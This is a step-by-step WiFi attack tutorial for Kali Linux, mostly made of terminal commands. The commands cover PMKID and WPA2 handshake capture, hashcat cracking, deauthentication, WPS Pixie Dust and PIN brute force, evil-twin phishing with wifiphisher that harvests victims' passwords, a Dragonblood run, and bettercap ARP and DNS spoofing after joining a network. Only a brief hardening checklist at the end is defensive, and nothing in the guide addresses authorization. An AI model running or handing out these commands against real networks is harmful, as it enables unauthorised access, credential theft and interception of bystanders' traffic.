Introduction

What Changed in 2025 — Read This First

Old tutorials break on Kali 2025 / kernel 6.12. These are the exact syntax changes that affect most commands:

Tool / Version Old (Broken) ✅ New 2025 Syntax
hcxdumptool ≥ 6.3 -o capture.pcapng -w capture.pcapng
hcxdumptool ≥ 6.3 --enable_status=1 --enable_status=15 or 31
hcxdumptool v7 airmon-ng for monitor mode Tool sets monitor itself (nl80211)
hcxdumptool v7 --filterlist_ap=file.txt --filterlist_ap=AABBCCDDEEFF
hcxpcapngtool -o hash.hc22000 -o hash.22000
hashcat -m 2500 (deprecated) -m 22000 (unified WPA)
monitor mode iwconfig wlan0 mode monitor iw wlan0 set monitor none
stop services airmon-ng check kill systemctl stop NetworkManager wpa_supplicant
💡
Why These Changes?

hcxdumptool v7 dropped all WEXT (Wireless Extensions) code — deprecated since Linux kernel 6.3. Kali 2025 ships kernel 6.12. hashcat -m 2500 is removed in newer builds — mode 22000 handles PMKID and EAPOL handshake in one unified format. Always build hcxdumptool from source for the latest syntax.

Chapter 1

PMKID Attack — Best Method 2025 Primary

No deauthentication needed, no waiting for clients. hcxdumptool connects to the AP and requests the PMKID directly. Always try this first on WPA2 networks.

1.1 — Theory

  • AP sends a PMKID in the first EAPOL frame to any device attempting to connect
  • PMKID = HMAC-SHA1-128(PMK, "PMK Name" + AP_MAC + Client_MAC)
  • PMK is derived from the WiFi password — cracking PMKID reveals the password
  • hcxdumptool v7 probes the AP directly — zero real clients needed

1.2 — Stop Interfering Services (Mandatory)

Terminal
# These fight with hcxdumptool for the interface
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# Verify they are stopped
systemctl is-active NetworkManager  # Must output: inactive
systemctl is-active wpa_supplicant   # Must output: inactive
⚠
Do NOT Use airmon-ng check kill

airmon-ng check kill only kills processes — systemd restarts them. Use systemctl stop. Also: hcxdumptool v7 sets monitor mode itself using nl80211. Do NOT pre-configure monitor mode with airmon-ng before running hcxdumptool.

1.3 — Capture PMKID (2025 Syntax)

Terminal
# ─── TARGETED: Attack one specific AP ───
sudo hcxdumptool -i wlan0 \
  -w capture.pcapng \
  -c 2437 \
  --filterlist_ap=aabbccddeeff \
  --filtermode=2 \
  --enable_status=15

# Flag reference:
# -w                  = output file  (OLD guides use -o — WRONG)
# -c 2437             = frequency MHz (NOT channel number)
# --filterlist_ap     = BSSID without colons, no spaces
# --filtermode=2      = only interact with target in filterlist
# --enable_status=15  = show PMKID/handshake capture events

# ─── 5GHz target ───
sudo hcxdumptool -i wlan0 -w cap5g.pcapng \
  -c 5180 --filterlist_ap=112233445566 --filtermode=2 --enable_status=15

# ─── Scan ALL channels ───
sudo hcxdumptool -i wlan0 -w capall.pcapng -F --enable_status=15

# Run 2–5 minutes then Ctrl+C
# Watch for: PMKIDROGUE = PMKID captured  |  M1M2ROGUE = handshake
💡
Status Messages Decoded

PMKIDROGUE = PMKID captured from AP (best case). M1M2ROGUE = Partial handshake from client (also crackable). M1M2M3M4 = Full 4-way handshake. All types are handled by hashcat -m 22000.

1.4 — Extract Hash

Terminal
# Convert pcapng → hashcat format 22000
hcxpcapngtool -o hash.22000 -E essids.txt capture.pcapng

# -o = hash file   -E = ESSID wordlist for smart cracking

# Verify capture
wc -l hash.22000
# 0 = nothing captured   1+ = proceed to cracking

# Preview hash format
head -1 hash.22000
# WPA*01*PMKID*AP_MAC*CLIENT_MAC*ESSID  (01 = PMKID)
# WPA*02*MIC*AP_MAC*CLIENT_MAC*ESSID    (02 = EAPOL)

1.5 — Crack with Hashcat (Recommended Order)

Terminal
# -m 22000 handles BOTH PMKID and EAPOL in one unified mode

# ─── Step 1: Smart PSK candidates (fast — try first) ───
hcxpsktool -c hash.22000 | hashcat --stdin -m 22000 hash.22000

# ─── Step 2: Dictionary + best rules ───
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# ─── Step 3: 8-digit brute force (common ISP defaults) ───
hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d

# ─── Step 4: ESSID-based smart wordlist ───
hcxeiutool -i essids.txt -d dig.txt -c chr.txt -x hex.txt -s sc.txt
cat essids.txt dig.txt chr.txt hex.txt sc.txt | sort -u > smart.txt
hashcat -m 22000 hash.22000 smart.txt

# ─── Show cracked result ───
hashcat -m 22000 hash.22000 --show
Chapter 2

WPA2 Handshake Capture

2.1 — hcxdumptool Method (Captures Both PMKID + Handshake)

Terminal
# Same command as PMKID — add --attemptclientmax for more handshake tries
sudo hcxdumptool -i wlan0 \
  -w capture.pcapng \
  -c 2437 \
  --filterlist_ap=aabbccddeeff \
  --filtermode=2 \
  --enable_status=15 \
  --attemptclientmax=10000

# Extract and crack:
hcxpcapngtool -o hash.22000 capture.pcapng
hashcat -m 22000 hash.22000 rockyou.txt -r best64.rule

2.2 — Classic aircrack-ng Method

Terminal
# Monitor mode — modern nl80211 (no deprecation warnings)
sudo ip link set wlan0 down
sudo iw wlan0 set monitor none
sudo ip link set wlan0 up

# Or with airmon-ng (still works, kernel warnings on 6.3+):
sudo airmon-ng check kill && sudo airmon-ng start wlan0

# Scan networks
sudo airodump-ng wlan0mon

# Capture on target AP
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w cap wlan0mon

# Deauth in new terminal
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Wait for: WPA handshake: AA:BB:CC:DD:EE:FF in top-right corner

# Crack — convert to 22000 first (faster with GPU)
hcxpcapngtool cap-01.cap -o hash.22000
hashcat -m 22000 hash.22000 rockyou.txt

# Or crack directly with aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt cap-01.cap
Chapter 3

WPS Attacks — Pixie Dust & PIN Brute Force

⚠
WPS in 2025

Most modern routers ship with WPS disabled. Ubiquiti AirFiber never had WPS. Pixie Dust only works on old Realtek/Ralink chipsets (pre-2018). Always check WPS status before attempting these attacks.

3.1 — Scan for WPS

Terminal
sudo airmon-ng start wlan0
sudo wash -i wlan0mon

# Output: BSSID | CH | dBm | WPS Version | WPS Locked | ESSID
# AA:BB:CC:DD:EE:FF  6  -65  2.0  No  HomeRouter
#                              ^^
#             WPS Locked = No → potentially vulnerable

3.2 — Pixie Dust Attack

Terminal
# -K 1 = Pixie Dust mode — works in seconds if vulnerable
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vvv

# Extra options for stubborn APs:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -N -S -vvv
# -N = no NACKs   -S = small DH keys

# Success output:
# [+] WPS PIN: '12345670'
# [+] WPA PSK: 'YourPassword'

3.3 — PIN Brute Force (Slow Fallback)

Terminal
# With delays to avoid WPS lockout
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 5 -r 3:60 -vvv
# -d 5 = 5s delay   -r 3:60 = sleep 60s after every 3 attempts

# bully alternative — handles some APs better
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3

# Resume an interrupted session
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv -s /tmp/reaver.session
Chapter 4

Evil Twin / Rogue AP Works on WPA2 + WPA3

Evil Twin bypasses encryption entirely via social engineering. It is the most reliable attack against WPA3 and networks with strong passwords.

4.1 — wifiphisher (Fully Automated — Recommended)

Terminal
sudo apt install wifiphisher

# ─── Fully automated (prompts you to pick target) ───
sudo wifiphisher

# ─── Targeted attack with specific network ───
sudo wifiphisher \
  -aI wlan0 \
  -jI wlan1 \
  --essid 'HomeNetwork' \
  -p firmware-upgrade \
  --force-hostapd

# Flag reference:
# -aI wlan0           = AP interface (hosts the fake network)
# -jI wlan1           = Jamming interface (deauths real AP)
# --essid             = clone this network name
# -p firmware-upgrade = captive portal template (most convincing)

# Other templates: oauth-login | wifi_connect | plugin_update

# Password captured when victim submits:
# [*] POST: wifipassword=MyPassword123
💡
Two Adapters for Best Results

wlan0 = host the fake AP. wlan1 = continuously deauthenticate from the real AP. wifiphisher handles this with -aI and -jI. With only one adapter, success rate drops significantly as clients may reconnect to the real AP.

WPA3 Testing — SAE / Dragonblood

5.1 — Test for Transition Mode (Most Likely to Work)

Terminal
# Many WPA3 routers run WPA2/WPA3 'Transition Mode'
# hcxdumptool can still capture WPA2 PMKID/handshake from these
sudo hcxdumptool -i wlan0 \
  -w wpa3test.pcapng \
  -c 2437 \
  --filterlist_ap=TARGETMACNOCOLONS \
  --filtermode=2 \
  --enable_status=15

hcxpcapngtool wpa3test.pcapng -o hash.22000
wc -l hash.22000
# > 0 lines = WPA2 fallback captured → crack like normal WPA2
# = 0 lines = pure WPA3 → use Evil Twin (Chapter 4)

5.2 — Dragonblood Attack (CVE-2019-9494, Unpatched Only)

Terminal
# Only effective on firmware from 2019 or earlier (most are patched)
git clone https://github.com/vanhoefm/dragonslayer
cd dragonslayer && pip3 install -r requirements.txt

sudo python3 dragonslayer.py \
  -i wlan0 \
  --target AA:BB:CC:DD:EE:FF \
  --ssid 'TargetNetwork'
📝
WPA3 Reality Check 2025

Pure WPA3 with updated firmware has no known practical offline cracking attack. Best approach: Evil Twin (wifiphisher) which bypasses crypto entirely. For your AirFiber: enable WPA3-ONLY mode (not transition mode) to block downgrade attacks.

Chapter 6

Advanced Hashcat Techniques

6.1 — Smart Candidate Pipeline (hcxtools)

Terminal
# ─── Step 1: Extract hash AND ESSID wordlist ───
hcxpcapngtool -o hash.22000 -E essids.txt capture.pcapng

# ─── Step 2: Generate variants from ESSIDs ───
hcxeiutool -i essids.txt -d digits.txt -x hex.txt -c chars.txt -s sc.txt

# ─── Step 3: Combine + deduplicate ───
cat essids.txt digits.txt hex.txt chars.txt sc.txt | sort -u > combined.txt

# ─── Step 4: Add rule-mangled variants ───
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule chars.txt \
  >> combined.txt
sort combined.txt | uniq > smartlist.txt

# ─── Step 5: Get weak PSK candidates ───
hcxpsktool -c hash.22000 >> smartlist.txt

# ─── Step 6: Crack ───
hashcat -m 22000 hash.22000 smartlist.txt
hashcat -m 22000 hash.22000 --show

6.2 — Attack Modes Reference

Mode Type Example Command
-a 0 Dictionary hashcat -m 22000 hash.22000 rockyou.txt
-a 0 -r Dict + Rules hashcat -m 22000 hash.22000 rockyou.txt -r best64.rule
-a 1 Combinator hashcat -m 22000 hash.22000 words1.txt words2.txt
-a 3 Brute Force hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d
-a 6 Dict + Mask hashcat -m 22000 hash.22000 words.txt -a 6 ?d?d?d
--stdin Pipe Input hcxpsktool -c hash.22000 | hashcat --stdin -m 22000 hash.22000

6.3 — Mask Charset Reference

Mask Character Set Example Match
?d 0–9 (digits) ?d×8 → 12345678
?l a–z (lowercase) ?l×8 → password
?u A–Z (uppercase) ?u?l×6 → Network
?a All printable Any keyboard character
?s Special !@#$%^&* Symbols only
?u?l?l?l?d?d?d?d Combined Home1234, Pass5678

Post-Connection Network Analysis

7.1 — Network Discovery

Terminal
# Find your IP and gateway
ip route show | grep default

# Discover all devices
sudo nmap -sn 192.168.1.0/24

# Detailed router scan
sudo nmap -sV -O -p 22,23,80,443,8080,8443 192.168.1.1

# Check for default credentials
sudo nmap -p 80,443 --script http-default-accounts 192.168.1.1

# Full vulnerability scan
sudo nmap --script vuln 192.168.1.1

7.2 — MitM with bettercap (Replaces Ettercap)

bettercap Interactive Console
sudo bettercap -iface wlan0

# Inside bettercap console:
net.probe on              # Discover all hosts
net.show                  # List discovered devices

# ARP poisoning — intercept specific target
set arp.spoof.targets 192.168.1.100
arp.spoof on
net.sniff on              # Capture cleartext credentials

# DNS spoofing
set dns.spoof.domains target.com
dns.spoof on

# HTTP proxy
http.proxy on

AirFiber Hardening Checklist

  • ✅ Enable WPA3-only mode (not transition) — blocks downgrade attacks
  • ✅ Disable WPS completely in router admin panel
  • ✅ Use a 20+ character random password — defeats offline cracking
  • ✅ Change default admin credentials — AirFiber ships with ubnt / ubnt
  • ✅ Update firmware regularly — patches Dragonblood CVEs
  • ✅ Disable remote management from the WAN interface
  • ✅ Enable client isolation on guest networks
  • ✅ Monitor connected devices list weekly for rogue clients
